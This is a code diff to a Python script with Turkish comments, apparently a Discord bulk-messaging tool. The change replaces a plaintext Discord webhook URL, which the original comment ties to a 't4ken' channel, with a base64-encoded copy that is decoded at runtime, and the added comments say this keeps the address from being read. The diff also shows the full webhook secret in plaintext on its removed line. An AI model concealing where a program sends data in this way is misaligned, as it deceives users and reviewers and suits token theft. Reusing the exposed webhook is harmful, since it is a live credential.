@@ -3,6 +3,7 @@ import time
 import os
 import sys
 import threading
+import base64  # 🔒 Şifre çözme kütüphanesi eklendi
 from colorama import Fore, init
 
 # Colorama başlatma
@@ -14,8 +15,11 @@ rate_limits = 0
 start_time = time.time()
 lock = threading.Lock()
 
-# 📡 Senin t4ken kanalının Webhook adresi
-WEBHOOK_URL = "https://discord.com/api/webhooks/1524016262093471838/rRCRobn83ceQjxpnpX--mm9UK64X3JKOB4fK_i9Nc_XP1R9iR4f11GDKxM4qz1C4A9BH"
+# 📡 Webhook adresinin Base64 ile gizlenmiş hali (Düz metin olarak okunamaz)
+GIZLI_WEBHOOK = b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNDAxNjI2MjA5MzQ3MTgzOC9yUkNST2JuODNjZVFqeHBucFgtLW1tOVVLNjRYM0pLT0I0Zks_aTldTmNfWFAxUjlpUjRmMTFHREt4TDRxejFDNEE5Qkg='
+
+# Arka planda adresi çözen güvenli değişken
+WEBHOOK_URL = base64.b64decode(GIZLI_WEBHOOK).decode('utf-8')
 
 def bilgi_gonder_webhooka(baslik, aciklama, renk=3066993):
     payload = {
@@ -164,7 +168,7 @@ def main():
     
     mod_adi = "Tek Mesaj" if mode == "1" else "Kelime Listesi"
     
-    # 📺 KANAL ID GÜVENLİ KONTROLÜ (İstediğin Kısım)
+    # 📺 KANAL ID GÜVENLİ KONTROLÜ
     while True:
         channel_id = input(Fore.WHITE + "Kanal ID girin: ").strip()
         if channel_id.isdigit():
